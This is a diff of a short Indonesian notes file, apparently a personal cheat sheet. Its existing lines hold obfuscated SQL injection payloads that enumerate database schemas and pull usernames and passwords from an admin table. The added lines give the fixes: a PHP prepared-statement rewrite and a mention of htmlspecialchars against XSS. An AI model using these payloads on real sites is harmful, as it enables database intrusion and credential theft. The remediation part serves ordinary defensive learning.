@@ -14,3 +14,33 @@ command SQL INJECTION via Chrome
 '/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/1,2,3,4,5,6,7,8,9-- -
 (select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)
 index.php/page?index=3%27/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/1,2,3,group_concat(username,0x3a,password),5,6,7,8+from+tbl_admin-- -
+
+---perbaikian sql injection---
+$conn = koneksi();
+$id = $_GET['id'];
+
+// Persiapkan statement SQL
+$stmt = mysqli_prepare($conn, "SELECT * FROM post WHERE id = ?");
+
+// Binding parameter
+mysqli_stmt_bind_param($stmt, 'i', $id);
+
+// Eksekusi query
+mysqli_stmt_execute($stmt);
+
+// Mendapatkan hasil
+$result = mysqli_stmt_get_result($stmt);
+$data = mysqli_fetch_assoc($result);
+
+$tag = $data["tag"];
+$parsedown = new Parsedown();
+$relateds = relatedPost($data);
+$relateds_count = count($relateds);
+
+// Jangan lupa menutup statement dan koneksi setelah selesai
+mysqli_stmt_close($stmt);
+mysqli_close($conn);
+
+--perbaikan xss---
+htmlspecialchars
+
